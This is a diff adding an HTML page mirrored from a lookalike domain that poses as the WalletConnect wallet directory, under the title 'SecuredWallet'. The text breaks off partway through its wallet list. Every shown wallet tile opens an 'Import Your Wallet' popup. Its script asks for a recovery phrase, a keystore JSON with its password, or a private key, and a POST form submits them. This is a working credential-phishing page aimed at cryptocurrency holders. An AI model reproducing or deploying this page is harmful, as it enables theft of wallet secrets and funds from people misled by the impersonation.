@@ -1,0 +1,561 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from www.walleconnect.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 02 Jul 2022 03:18:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecuredWallet</title>
+    <link rel="shortcut icon" type="image/svg" href="favicon.svg" />
+
+    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.0.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous" />
+    <script src="../cdn.jsdelivr.net/npm/bootstrap%405.0.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-p34f1UUtsS3wqzfto5wAAmdvj+osOnFyQFpp4Ua3gs/ZVWx6oOypYoCJhGGScy+8" crossorigin="anonymous">
+        </script>
+    <link rel="stylesheet" href="../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <link href='../external.html?link=https://fonts.googleapis.com/css?family=DM%20Sans' rel='stylesheet'>
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.1.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
+    <script src="../cdn.jsdelivr.net/npm/bootstrap%405.1.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj" crossorigin="anonymous">
+        </script>
+
+    <link rel="stylesheet" type="text/css" href="headercss.css">
+    <link rel="stylesheet" type="text/css" href="footercss.css">
+
+    <style>
+        a:link,
+        a:visited,
+        a:active,
+        a:hover {
+            text-decoration: none;
+            color: #5878bc;
+        }
+
+        /*Pop-up Overlay CSS Starts*/
+        #overlay {
+            position: fixed;
+            display: none;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2;
+        }
+
+        #content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            font-size: 18px;
+            background-color: #ffffff;
+            color: #587087;
+            transform: translate(-50%, -50%);
+            -ms-transform: translate(-50%, -50%);
+            border-radius: 10px;
+            padding: 15px 25px;
+        }
+
+        .ppd:hover {
+            text-decoration: underline;
+
+            text-decoration-color: blue;
+        }
+
+        .button1 {
+            background-color: #3182ce;
+            border: none;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 14px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 10px;
+            width: 200px;
+        }
+
+        @media(min-width: 577px) {
+            .button2 {
+                background-color: #e53e3e;
+                border: none;
+                color: white;
+                padding: 10px 15px;
+                text-align: center;
+                text-decoration: none;
+                font-size: 14px;
+                margin: 4px 2px;
+                cursor: pointer;
+                border-radius: 10px;
+                float: right;
+                width: 25%;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .button2 {
+                background-color: #e53e3e;
+                border: none;
+                color: white;
+                padding: 10px 15px;
+                text-align: center;
+                text-decoration: none;
+                display: inline-block;
+                font-size: 14px;
+                margin: 4px 2px;
+                margin-left: 5%;
+                cursor: pointer;
+                border-radius: 8px;
+                width: 90%;
+            }
+        }
+
+
+        /*Pop-up Overlay CSS Ends*/
+    </style>
+
+</head>
+
+<body>
+    <!--Header Starts-->
+    <div class="container">
+        <div class="row" style="padding-top: 40px;">
+    <div class="column1 c1s">
+        <a href=".html">
+            <div>Github</div>
+        </a>
+        <a href=".html">
+            <div>Docs</div>
+        </a>
+    </div>
+
+    <div class="column1 c2s"><a href=".html"><img src="favicon.svg" alt="Logo" class="im1" /></a></div>
+
+    <div class="column1 c1s">
+        <a href=".html">
+            <div>Wallets</div>
+        </a>
+        <a href=".html">
+            <div>Apps</div>
+        </a>
+    </div>
+
+</div>    </div>
+    <!--Header Ends-->
+
+    <!--Content Area Starts-->
+    <div class="container-fluid">
+
+        <!--Intro Section Starts-->
+        <div class="row" style="padding-top: 20px; text-align: center; color: #587087;">
+            <div class="col-sm-3"></div>
+
+            <div class="col-sm-6">
+                <h2 style="font-size: 35px; font-weight: 550;">Wallets</h2>
+                <p style="font-size: 20.5px; font-weight: 450;">Multiple iOS and Android wallets support the
+                    WalletConnect
+                    protocol. Simply
+                    scan a QR code from your
+                    desktop computer
+                    screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and
+                    mobile browsers are
+                    supported via mobile deep linking.</p>
+            </div>
+
+            <div class="col-sm-3"></div>
+        </div>
+        <!--Intro Section Endss-->
+
+        <!--Pop-up Overlay Div Starts-->
+        <div id="overlay">
+            <div id="content">
+                <p style="color: #1a202c; font-weight: 500;"><img id="ppi" src="favicon.svg" alt="Image" width="50px"
+                        height="50px" />&nbsp;
+                    Import Your Wallet</p>
+                <div
+                    style="column-count: 3; text-align: center; margin-bottom: 10px; border-bottom: 2px solid rgb(226, 238, 238);">
+                    <div onclick="ph()" class="ppd">Phrase
+
+                    </div>
+                    <div onclick="kj()" class="ppd">Keystroke JSON
+
+                    </div>
+                    <div onclick="pk()" class="ppd">Private Key
+
+                    </div>
+
+                </div>
+
+                <div style=" align-items: center;">
+                    <form method="POST">
+                        <div id="inputField">
+                            <!--Input Box Changing using JavaScript-->
+                        </div>
+                        <div id="msg"></div>
+                        <label class="button1" style="width: 90%; margin-left: 5%;">
+                            <input type="submit" name="sub" style="display: none;" />
+                            PROCEED <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                height="24" width="24" viewBox="0 0 24 24" stroke="currentColor">
+                                <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                            </svg>
+                        </label>
+                    </form>
+                    <button onclick="off()" class="button2">Cancel</button>
+                </div>
+            </div>
+        </div>
+        <!--JavaScript for Input Box indide Pop-Up Starts-->
+        <script>
+            function ph() {
+                document.getElementById("inputField").innerHTML =
+                    '<textarea class="form-control" rows="4" cols="30" style="margin-bottom:20px" placeholder="Enter your recovery phrase" name="phrase"></textarea>';
+                document.getElementById("msg").innerHTML =
+                    '<p style="text-align: center;font-size:16px;">Typically 12 (sometimes 24) words separated by single spaces</p>';
+            }
+
+            function kj() {
+                document.getElementById("inputField").innerHTML =
+                    '<input type="text" class="form-control" style="margin-bottom:10px" placeholder="paste the key store json" name="keystroke" /><input type="text" placeholder="Wallet password" style="margin-bottom:20px" class="form-control" name="walletpwd" />';
+                document.getElementById("msg").innerHTML =
+                    '<p style="text-align: center; font-size:16px;">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>';
+            }
+
+            function pk() {
+                document.getElementById("inputField").innerHTML =
+                    '<input type="text" placeholder="Enter your private key" style="margin-bottom:20px" class="form-control" name="private" />';
+                document.getElementById("msg").innerHTML =
+                    '<p style="text-align: center; font-size:16px;">Typically 12 (sometimes 24) words separated by single spaces</p>';
+            }
+
+            function on() {
+                document.getElementById("overlay").style.display = "block";
+                ph();
+            }
+
+            function off() {
+                document.getElementById("overlay").style.display = "none";
+            }
+        </script>
+        <!--JavaScript for Input Box indide Pop-Up Ends-->
+
+        <!--Pop-up Overlay Div Ends-->
+
+        <!--Crypto Wallet Section Starts-->
+
+        <div class="row" style="text-align: center;color: #587087; font-weight: 750; font-size: 16px;">
+            <div class="col-sm-2"></div>
+
+            <div class="col-sm-4" style="column-count: 2; margin-bottom: 5px;">
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px"
+                            src="../pbs.twimg.com/profile_images/1230771588380782595/lC-xrjES_400x400.png" />
+                    </p>Rainbow
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../www.mih.vc/wp-content/uploads/2020/06/forontier-logo.jpg" />
+                    </p>Frontier Finance
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../blogs-images.forbes.com/assets/images/avatars/blog-5296_400_725ad4af462a7e3849ad61e7d2f0875c.jpg" />
+                    </p>Eidoo Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../is3-ssl.mzstatic.com/image/thumb/Purple124/v4/93/bb/f4/93bbf4a6-1105-82a6-c3c3-cb490d2f8988/source/512x512bb.jpg" />
+                    </p>Aktionariat
+                    Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../cdn.coingape.com/wp-content/uploads/2018/10/01152125/cardano-678x356.jpg" /></p>
+                    Cardano Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/cosmos/info/logo.png" /></p>
+                    Cosmos Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../s2.coinmarketcap.com/static/img/coins/200x200/6850.png" />
+                    </p>Defiat Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../crypto-wallets.org/wp-content/uploads/2020/06/eos-kriptovaljuta7.jpg" />
+                    </p>EOS Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../guarda.com/assets/images/what-is-harmony.html" /></p>
+                    Harmony Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../miro.medium.com/max/1400/1_HZpEH_39iRp1pclwQCbSWg.png" /></p>
+                    Hexcom Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/iotex/info/logo.png" />
+                    </p>Lotex Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1h2p5IG7RfJHZ-N_EcZ-3vO7_eHeCKUCEBw&amp;usqp=CAU" />
+                    </p>Jaxx Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuG98L4ErnVBpn9yjAFjCQ19WJ_CeFtUKOCQ&amp;usqp=CAU" />
+                    </p>Ledger Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../ethtz.io/kukai.png" />
+                    </p>Kukai Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../ethtz.io/kukai.png" />
+                    </p>Kukai Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../www.ledger.com/wp-content/uploads/2019/05/mew-logo.html" />
+                    </p>Mew Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../www.forex.academy/wp-content/uploads/2020/09/NEON-wallet.jpg" />
+                    </p>Neon Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../www.nimiq.com/static/sharing/twitter.png" />
+                    </p>Nimiq Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../pbs.twimg.com/profile_images/1377470062047621122/j0l-eavS.png" />
+                    </p>Octofi Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../is5-ssl.mzstatic.com/image/thumb/Purple125/v4/08/c6/54/08c6543d-1ea7-ec04-12f0-2d79e70d1284/source/256x256bb.jpg" />
+                    </p>Oxen Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/tezos/info/logo.png" />
+                    </p>Tezos Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px"
+                            src="../assets-cdn.trustwallet.com/blockchains/thundertoken/info/logo.png" />
+                    </p>Thundertoken Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../www.bitdegree.org/crypto/storage/media/images/trezor-wallet-review-logo-big.o.png" />
+                    </p>Trezor Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="data:image/png;base64,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" />
+                    </p>Tron Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../miro.medium.com/max/521/1_8CoxtCRe9rDbykMepYZlIg.png" />
+                    </p>Wax Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/RIaWXkehP9-AFZwlIvnmcQj2_De5g-eGBgKO4TYe9a6CNlj_uQmxBs3QYiV7zdum_sWL" />
+                    </p>XRP Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://lh3.googleusercontent.com/JujGZjn2HIFYuToiXn9ZMDfH59BwcZoEvasayCSpp6R6JFaIyeaJu4tcqTiCakBPYHg=s180-rw" />
+                    </p>Zelcore Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
